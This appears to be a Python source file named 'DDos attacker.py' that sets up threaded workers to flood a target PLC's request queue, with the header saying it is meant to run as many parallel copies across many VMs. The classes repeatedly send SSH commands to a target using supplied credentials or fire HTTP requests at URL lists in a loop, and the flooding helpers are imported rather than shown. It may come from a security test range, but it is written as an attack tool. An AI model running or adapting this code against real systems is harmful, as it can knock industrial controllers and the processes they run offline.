#-----------------------------------------------------------------------------
# Name:        DDos attacker.py
#
# Purpose:     A simple PLC request sender program try to full fill the target PLC's 
#              request handling queue. This program need to be run on multiple machine
#              with multiple thread. for example run 100 this program parallel 
#              on 10 vms.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

import time
import threading

# lib used to create the  
from SSHconnector import sshConnector
from networkServiceProber import networkServiceProber

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class attackThread(threading.Thread):
    """ Every detailed attack actor will be hooked in a attack thread or inherit 
        from a attack thread to run parallel with the main thread.
    """
    def __init__(self, parent, threadID, attackActor, repeatTime=None) -> None:
        threading.Thread.__init__(self)
        self.parent = parent
        self.threadID = threadID
        self.repeatTime = repeatTime
        self.attackActor = attackActor
        self.attackStart = False
        self.atkCount = 0
        self.terminate = False

    def initAttacker(self, paramDict):
        return None

    def _runAttack(self):
        pass 

    #-----------------------------------------------------------------------------
    def run(self):
        print('Attack Thread %s : Ready for DDoS attack' %str(self.threadID))
        while not self.terminate:
            if self.attackStart:
                self._runAttack()
                self.atkCount += 1 
            else:
                time.sleep(0.1)
        print('Attack Thread %s : Terminated.' %str(self.threadID))

    #-----------------------------------------------------------------------------
    def getAttackState(self):
        return (self.attackStart, self.atkCount)

    #-----------------------------------------------------------------------------
    def setAttacker(self, attacker):
        self.attackActor = attacker

    #-----------------------------------------------------------------------------
    def setStartAtk(self, atkFlg):
        self.attackStart = atkFlg
        if self.attackStart : 
            print("Attack Thread %s : start attack..." %str(self.threadID))
            self.atkCount = 0
        else: 
            print("Attack Thread %s : pause attack" %str(self.threadID))

    #-----------------------------------------------------------------------------
    def stop(self):   
        try:
            if self.attackActor:self.attackActor.stop()
        except Exception as err:
            print("The attack actor stop() function is not callable. ")
            print("Error: %s" %str(err))
        finally:
            self.attackStart = False 
            self.terminate = True

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------

class attackThreadSSH(attackThread):

    def __init__(self, parent, threadID, attackActor, repeatTime=None) -> None:
        super().__init__(parent, threadID, attackActor)

    def initAttacker(self, paramDict):
        self.attackActor = sshConnector(None, 
                                        paramDict['ipaddress'], 
                                        paramDict['username'], 
                                        paramDict['password'])
        # add the command execution list
        for cmdStr in paramDict['cmdlines']:
            self.attackActor.addCmd(cmdStr, self.testRplFunction)
        self.attackActor.InitTunnel()
        self.cmdInterval = paramDict['cmdinterval']

    def _runAttack(self):
        self.attackActor.runCmd(interval=self.cmdInterval)

    def testRplFunction(self, replyStr):
        print("Got reply: %s" % str(replyStr))
        return

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class attackThreadHttp(attackThread):

    def __init__(self, parent, threadID, attackActor, repeatTime=None) -> None:
        super().__init__(parent, threadID, attackActor)

    def initAttacker(self, paramDict):
        self.attackActor = networkServiceProber()
        self.paramDict = paramDict

    def _runAttack(self):
        if str(self.paramDict['type']).upper() == 'URL':
            self.attackActor.checkUrlsConn(self.paramDict['urlList'])
            #rst = self.attackActor.checkUrlsConn(self.paramDict['urlList'])
            #print(rst)
        else:
            for reqDict in self.paramDict['urlList']:
                url = reqDict['url']
                requestType = reqDict['type']
                parm = reqDict['parm']
                self.attackActor.checkHttpRquest(requestType, url, parm)